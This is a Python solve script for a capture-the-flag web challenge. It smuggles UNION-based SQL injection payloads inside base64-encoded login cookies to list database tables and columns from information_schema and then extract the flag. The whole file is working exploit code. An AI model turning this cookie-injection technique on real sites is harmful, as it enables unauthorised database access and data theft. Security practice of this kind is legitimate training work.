import base64
import requests
from bs4 import BeautifulSoup

r = requests.Session()

url = "http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php"

cookie = '{{"ID": "{:s}"}}'

payload1 = "0 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {:d}"
tables = []

for i in range(1, 82):
    c = base64.b64encode(
        cookie.format(
            payload1.format(i)
        ).encode()
    ).decode()

    req = r.get(url, cookies={"login":c})

    soup = BeautifulSoup(req.text, "html.parser")
    h1 = soup.find("h1")
    tables.append(h1.text.split()[1][:-1])

t = tables[len(tables)-3] # here_is_the_flag

payload2 = "0 UNION SELECT column_name FROM information_schema.columns WHERE table_name='{:s}' LIMIT 1 OFFSET {:d}"
columns = []

for i in range(20):
    c = base64.b64encode(
        cookie.format(
            payload2.format(t, i)
        ).encode()
    ).decode()

    req = r.get(url, cookies={"login":c})

    soup = BeautifulSoup(req.text, "html.parser")
    h1 = soup.find("h1")
    columns.append(h1.text.split()[1][:-1])

c = columns[0] # flag

payload3 = f"0 UNION SELECT {c} FROM {t}"
c = base64.b64encode( cookie.format(payload3).encode() ).decode()

req = r.get(url, cookies={"login":c})

print(req.text)